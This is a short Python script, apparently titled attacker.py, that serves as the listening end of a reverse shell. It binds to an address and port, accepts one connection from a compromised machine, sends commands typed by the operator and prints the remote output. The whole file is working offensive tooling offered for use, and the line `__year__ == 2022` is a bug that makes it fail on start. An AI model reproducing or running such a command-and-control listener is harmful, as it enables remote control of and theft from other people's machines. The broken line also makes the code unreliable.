import socket
import threading
import argparse


__author__ = "0xded"
__year__ == 2022


flag = True

def sendData(target: socket.socket) -> None:
    global flag
    while flag:
        command = input("Enter command: ")            
        if "stop" in command or "exit" in command or "quit" in command:
            target.send(command.encode("utf-8"))
            flag = False
            break

        target.send(command.encode("utf-8"))
        
    print("[X] Shutting Down")
    target.close()

    return

def recvData(sender: socket.socket) -> None:
    global flag
    while flag:
        try:
            response = sender.recv(1)
            print(response.decode("utf-8"), end="")
        except ConnectionAbortedError:
            pass
        except UnicodeDecodeError:
            pass
        except Exception as e:
            print(f"[!] (recvData) exception: {e}")
            break

    sender.close()
    return

def argument_parser():
    parser = argparse.ArgumentParser(description="Parser of attacker.py")
    parser.add_argument("--address", type=str, required=True)
    parser.add_argument("--port", type=int, required=True)

    return parser.parse_args()


if __name__ == "__main__":
    arguments = argument_parser()
    addr = (arguments.address, arguments.port)
    
    attackSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attackSock.bind(addr)
    attackSock.listen()
    print(f"[*] Listening on port {arguments.port}")

    attackSock, clientAddr = attackSock.accept()
    print(f"[+] Connection established with {clientAddr[0]}")

    recvThread = threading.Thread(target=recvData, args=(attackSock,))
    recvThread.start()
    print("[+] recvThread started")

    sendThread = threading.Thread(target=sendData, args=(attackSock,))
    sendThread.start()
    print("[+] sendThread started")
